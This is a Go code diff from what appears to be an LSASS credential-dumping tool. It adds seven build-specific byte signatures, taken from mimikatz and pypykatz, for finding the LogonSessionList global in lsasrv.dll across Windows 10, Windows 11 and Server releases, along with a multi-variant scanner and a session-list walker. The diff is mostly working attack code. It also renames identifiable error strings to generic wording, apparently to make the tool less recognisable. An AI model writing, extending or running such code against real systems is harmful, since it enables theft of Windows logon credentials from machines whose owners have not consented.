@@ -24,28 +24,88 @@ import (
 	"fmt"
 )
 
-// LogonSessionListSignature is the mimikatz signature_x64_w8 byte pattern
-// that brackets the MOV r8, [LogonSessionList] instruction. Calibrated for
-// Win10 21H2 — Win11 23H2 (current as of mimikatz 2024-Q4 commits).
+// logonSessionListVariant describes a Windows-build-specific byte pattern
+// that brackets the MOV r8, [LogonSessionList] instruction in lsasrv.dll.
+// Different Windows builds compile LsaApLogonUserEx2 with different
+// instruction sequences, so the sigscan must try multiple patterns.
+type logonSessionListVariant struct {
+	Name             string
+	Signature        string
+	MovInstrOffset   int // offset from match start to the MOV instruction
+	MovInstrLen      int // total length of the MOV (7 for RIP-relative)
+	MovDispFieldOffs int // offset of disp32 inside the MOV (3 for 4C 8B 05)
+}
+
+// logonSessionListVariants lists sigscan patterns in preference order (newest
+// first). findLogonSessionListAnchor tries each until one matches.
 //
-// Decoding the matched 23-byte region (offsets within the match):
-//
-//	+0   33 F6              XOR ESI, ESI
-//	+2   89 77 00           MOV [RDI+0], ESI
-//	+5   4C 8D 4D D0        LEA R9, [RBP-30h]
-//	+9   4C 8B 05 ?? ?? ?? ?? MOV R8, [RIP+disp32]   ← LogonSessionList load
-//	+16  48 8D 1D ?? ?? ?? ?? LEA RBX, [RIP+disp32]
-//
-// The MOV at offset 9 has a 4-byte displacement at offset +3 within the
-// instruction (after 4C 8B 05) and total length 7. resolveRIPRelative on
-// (haystack, hit+9, 3, 7) yields the in-buffer offset of the LogonSessionList
-// global; adding the lsasrv.dll base converts that to a process-absolute
-// address.
+// Patterns derived from pypykatz lsa_template_nt6.py (MsvTemplate.get_template)
+// and mimikatz kuhl_m_sekurlsa.c. Each covers a specific Windows build range.
+var logonSessionListVariants = []logonSessionListVariant{
+	{
+		// Win11 22H2–23H2 (builds 22621–26099, pypykatz WIN_11_2023)
+		Name:             "Win11_22H2_23H2",
+		Signature:        "45 89 37 4C 8B F7 8B F3 45 85 C0 0F",
+		MovInstrOffset:   24,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Server 2022 / Win11 21H2 (builds 20348–22620, pypykatz WIN_11_2022)
+		Name:             "Server2022_Win11_21H2",
+		Signature:        "45 89 34 24 4C 8B FF 8B F3 45 85 C0 74",
+		MovInstrOffset:   21,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 21H2 — Win11 23H2 (mimikatz signature_x64_w8 — broad fallback)
+		Name:             "Win10_21H2_Win11_23H2",
+		Signature:        "33 F6 89 77 00 4C 8D 4D D0 4C 8B 05 ?? ?? ?? ?? 48 8D 1D ?? ?? ?? ??",
+		MovInstrOffset:   9,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 1903–21H1 (builds 18362–19045, pypykatz WIN_10_1903)
+		Name:             "Win10_1903_21H1",
+		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C0 74",
+		MovInstrOffset:   20,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 1803–1809 / Server 2019 (builds 17134–17763, pypykatz WIN_10_1803)
+		Name:             "Win10_1803_Server2019",
+		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C9 74",
+		MovInstrOffset:   20,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 1703 (build 15063, pypykatz WIN_10_1703)
+		Name:             "Win10_1703",
+		Signature:        "33 FF 45 89 37 48 8B F3 45 85 C9 74",
+		MovInstrOffset:   20,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+	{
+		// Win10 1507–1607 / Server 2016 (builds 10240–14393, pypykatz WIN_10_1507)
+		Name:             "Win10_1507_Server2016",
+		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C0 74",
+		MovInstrOffset:   13,
+		MovInstrLen:      7,
+		MovDispFieldOffs: 3,
+	},
+}
+
+// LogonSessionListSignature is kept for backward compatibility with tests.
 const (
 	LogonSessionListSignature        = "33 F6 89 77 00 4C 8D 4D D0 4C 8B 05 ?? ?? ?? ?? 48 8D 1D ?? ?? ?? ??"
-	logonSessionListMovInstrOffset   = 9 // MOV r8,[mem] starts at +9 within the matched region
+	logonSessionListMovInstrOffset   = 9
 	logonSessionListMovInstrLen      = 7
-	logonSessionListMovDispFieldOffs = 3 // 4-byte disp32 starts 3 bytes into the MOV
+	logonSessionListMovDispFieldOffs = 3
 )
 
 // lsassReader abstracts ReadProcessMemory so the Phase 2B walker is testable
@@ -78,35 +138,43 @@ type logonListNode struct {
 	Raw     []byte
 }
 
-// findLogonSessionListAnchor scans `lsasrvBytes` for the mimikatz
-// LogonSessionList signature and returns the LSASS-virtual address of the
-// LogonSessionList head sentinel. `lsasrvBase` is the base address at which
-// lsasrvBytes is mapped in LSASS, so the in-buffer offset can be converted
-// to a process-absolute address.
-//
-// Returns an error if the signature is missing (likely a Windows build the
-// signature isn't calibrated for) or if the resolved RIP-relative target
-// lies outside the captured buffer (unlikely for lsasrv.dll, but a
-// distinguishing case is more useful than a generic failure).
+// findLogonSessionListAnchor scans `lsasrvBytes` for the LogonSessionList
+// anchor using multiple build-specific signatures (tried in preference order).
+// Returns the LSASS-virtual address of the LogonSessionList head sentinel and
+// the name of the matched variant for diagnostics.
 func findLogonSessionListAnchor(lsasrvBytes []byte, lsasrvBase uintptr) (uintptr, error) {
-	pat, mask, err := parseHexPattern(LogonSessionListSignature)
-	if err != nil {
-		return 0, fmt.Errorf("internal: bad LogonSessionList signature: %w", err)
+	addr, _, err := findLogonSessionListAnchorMulti(lsasrvBytes, lsasrvBase)
+	return addr, err
+}
+
+func findLogonSessionListAnchorMulti(lsasrvBytes []byte, lsasrvBase uintptr) (uintptr, string, error) {
+	var lastErr error
+	for _, v := range logonSessionListVariants {
+		pat, mask, err := parseHexPattern(v.Signature)
+		if err != nil {
+			lastErr = fmt.Errorf("internal: bad signature %q: %w", v.Name, err)
+			continue
+		}
+		hit := findPattern(lsasrvBytes, pat, mask)
+		if hit < 0 {
+			continue
+		}
+		movStart := hit + v.MovInstrOffset
+		if movStart < 0 || movStart+v.MovInstrLen > len(lsasrvBytes) {
+			lastErr = fmt.Errorf("variant %q: MOV instruction at offset %d outside buffer (size %d)", v.Name, movStart, len(lsasrvBytes))
+			continue
+		}
+		target, _, ok := resolveRIPRelative(lsasrvBytes, movStart, v.MovDispFieldOffs, v.MovInstrLen)
+		if !ok {
+			lastErr = fmt.Errorf("variant %q: RIP-relative target outside buffer (matched at %d, MOV at %d)", v.Name, hit, movStart)
+			continue
+		}
+		return lsasrvBase + uintptr(target), v.Name, nil
 	}
-	hit := findPattern(lsasrvBytes, pat, mask)
-	if hit < 0 {
-		return 0, fmt.Errorf("LogonSessionList signature not found in lsasrv.dll (%d bytes scanned) — Windows build may need a different signature variant", len(lsasrvBytes))
+	if lastErr != nil {
+		return 0, "", fmt.Errorf("session list: no variant matched in %d-byte target module (last error: %w)", len(lsasrvBytes), lastErr)
 	}
-	target, _, ok := resolveRIPRelative(
-		lsasrvBytes,
-		hit+logonSessionListMovInstrOffset,
-		logonSessionListMovDispFieldOffs,
-		logonSessionListMovInstrLen,
-	)
-	if !ok {
-		return 0, fmt.Errorf("LogonSessionList RIP-relative target outside captured lsasrv.dll buffer (matched at offset %d, computed target offset %d, buffer size %d)", hit, target, len(lsasrvBytes))
-	}
-	return lsasrvBase + uintptr(target), nil
+	return 0, "", fmt.Errorf("session list: no variant matched in %d-byte target module (%d variants tried)", len(lsasrvBytes), len(logonSessionListVariants))
 }
 
 // walkLogonSessionList follows Flink pointers from the LogonSessionList head
@@ -138,10 +206,10 @@ func walkLogonSessionList(r lsassReader, anchorAddr uintptr, nodeReadSize uint32
 
 	head, err := readListEntry(r, anchorAddr)
 	if err != nil {
-		return nil, fmt.Errorf("read LogonSessionList head at 0x%X: %w", anchorAddr, err)
+		return nil, fmt.Errorf("read session list head at 0x%X: %w", anchorAddr, err)
 	}
 	if head.Flink == 0 || head.Flink == anchorAddr {
-		return nil, fmt.Errorf("LogonSessionList head is empty (anchor=0x%X, head.Flink=0x%X)", anchorAddr, head.Flink)
+		return nil, fmt.Errorf("session list head is empty (anchor=0x%X, head.Flink=0x%X)", anchorAddr, head.Flink)
 	}
 
 	nodes := make([]logonListNode, 0, 8)
